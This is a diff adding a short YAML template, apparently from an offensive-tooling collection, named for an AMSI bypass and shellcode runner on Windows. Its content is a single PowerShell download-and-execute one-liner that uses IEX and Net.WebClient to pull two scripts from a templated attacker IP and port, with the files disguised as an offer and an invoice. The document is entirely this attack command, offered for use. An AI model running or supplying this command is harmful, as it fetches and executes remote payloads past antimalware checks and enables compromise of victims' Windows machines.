@@ -1,0 +1,9 @@
+---
+metadata:
+  filename: "transfer-amsi-bypass-shellcode-runner-windows-powershell.yaml"
+  tags: ["windows", "evasion"]
+  created: "2026-05-30"
+  authors: ["@s3mme", "@TIVKU"]
+
+content: |-
+  IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/offer.txt"); Start-Sleep -Seconds 1; IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/invoice.txt")
